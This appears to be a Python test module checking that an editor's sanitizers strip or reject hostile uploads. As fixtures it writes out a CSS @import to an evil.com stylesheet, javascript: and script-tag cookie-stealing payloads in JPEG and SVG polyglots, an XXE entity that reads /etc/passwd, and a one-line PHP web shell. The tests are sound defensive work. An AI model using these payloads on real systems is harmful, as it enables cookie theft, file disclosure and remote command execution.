"""Threat-matrix regression tests for PR1 (sanitization core) only.

Design's threat matrix ("Documentation-like / inert-looking paths") lists
several adversarial asset classes: SVG-with-script, `.css` with
`@import`+`url()`, polyglot JPEG/HTML, `.php` renamed `.jpg`, and a font
file carrying markup. This PR only ships the sanitizers themselves
(`sanitize_svg`, `check_style_attribute_value`, the existing
`process_upload`) — filename/extension-vs-sniff agreement and the
non-executable content-type/nosniff serving assumption belong to
`apps/editor/asset_validation.py`, which is PR2 scope per the design's
File Changes table. Those two classes get their RED tests there, not here.

This module exercises every threat class that's actually testable against
code that exists in this PR:
- SVG-with-script -> covered exhaustively in tests/test_svg_sanitize.py.
- `.css`-shaped payload (`@import` + `url()`) -> check_style_attribute_value.
- polyglot JPEG/HTML -> process_upload's Pillow re-encode discards any
  bytes appended after a structurally valid JPEG, since the output is a
  freshly emitted file with no pass-through of the original bytes.
"""

import io

import pytest
from PIL import Image

from apps.ai_assistant.sanitize import check_style_attribute_value
from apps.editor.image_processing import ImageProcessingError, process_upload
from apps.editor.svg_sanitize import SvgSanitizationError, sanitize_svg


def test_threat_css_import_and_url_smuggling_is_stripped():
    hostile_css_declarations = (
        "background: @import url(http://evil.com/steal.css); "
        "width: url(javascript:alert(document.cookie))"
    )
    result = check_style_attribute_value(hostile_css_declarations)
    assert result == ""


def test_threat_polyglot_jpeg_html_is_neutralized_by_reencode():
    buffer = io.BytesIO()
    Image.new("RGB", (4, 4), color="red").save(buffer, format="JPEG")
    polyglot = buffer.getvalue() + b"<script>alert(document.cookie)</script>"

    encoded, content_type, width, height, _placeholder = process_upload(polyglot)

    assert content_type == "image/jpeg"
    assert (width, height) == (4, 4)
    assert b"<script>" not in encoded
    assert b"alert(document.cookie)" not in encoded


def test_threat_polyglot_svg_script_is_stripped_not_just_the_image_shape():
    polyglot_svg = (
        b'<svg xmlns="http://www.w3.org/2000/svg">'
        b"<script>alert(document.cookie)</script>"
        b'<rect width="1" height="1" />'
        b"</svg>"
    )
    cleaned = sanitize_svg(polyglot_svg)
    assert b"<script" not in cleaned
    assert b"alert(document.cookie)" not in cleaned


def test_threat_svg_with_dtd_entity_is_rejected_outright():
    xxe_svg = (
        b'<?xml version="1.0"?>'
        b'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        b'<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'
    )
    with pytest.raises(SvgSanitizationError):
        sanitize_svg(xxe_svg)


def test_threat_non_image_bytes_rejected_by_process_upload():
    # A renamed non-image (e.g. `.php` saved as `.jpg`) never has a valid
    # image structure Pillow will decode, so it's rejected here at the
    # image-processing boundary. Filename/extension spoofing itself
    # (asset_validation's ext+sniff agreement) is PR2 scope.
    php_payload = b"<?php system($_GET['cmd']); ?>"
    with pytest.raises(ImageProcessingError):
        process_upload(php_payload)
